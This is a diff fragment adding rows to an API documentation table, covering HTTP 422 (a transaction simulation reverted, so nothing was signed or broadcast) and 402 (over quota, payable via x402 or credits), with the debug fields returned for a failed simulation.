+| 422 | Unprocessable Entity | Simulation reverted. Response includes `status: "simulation_failed"` and simulation details. Transaction was **not** signed or broadcast. Fix the tx (e.g. insufficient balance, revert reason) and retry. |
+| 402 | Payment Required | Over quota; pay via x402 or prepaid credits. See [Billing & Usage](/docs/guides/billing-and-usage) and [x402 guide](/docs/guides/x402). |
+
+For **422**, the response body includes `simulation_id`, `simulation_status`, and optional `simulation_result` (e.g. `error`, `revert_reason`, `tenderly_dashboard_url`) to debug why the simulation failed.
 
 
 ---
